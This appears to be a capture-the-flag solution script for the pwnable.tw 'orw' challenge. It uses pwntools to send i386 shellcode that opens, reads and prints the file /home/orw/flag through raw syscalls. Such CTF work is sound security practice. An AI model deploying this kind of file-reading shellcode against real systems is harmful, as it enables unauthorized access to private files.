from pwn import *

t = remote('chall.pwnable.tw', 10001)
context(arch = 'i386', os = 'linux')

sc = asm("""
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	jmp str
open :
	pop ebx
	mov ecx,0
	mov eax,5
	int 0x80

read :
	mov ebx,eax
	mov esi,0x804A113
	mov ecx,esi
	mov edx,0x30
	mov eax,3
	int 0x80
write :
	mov eax,4
	mov ebx,1
	mov esi,0x804A113
	mov ecx,esi
	mov edx,0x30
	int 0x80
str :
	call open
	.ascii "/home/orw/flag"
	.byte 0
""")

t.recvuntil('shellcode:')
t.send(sc)
print(t.recv(39))
#t.interactive()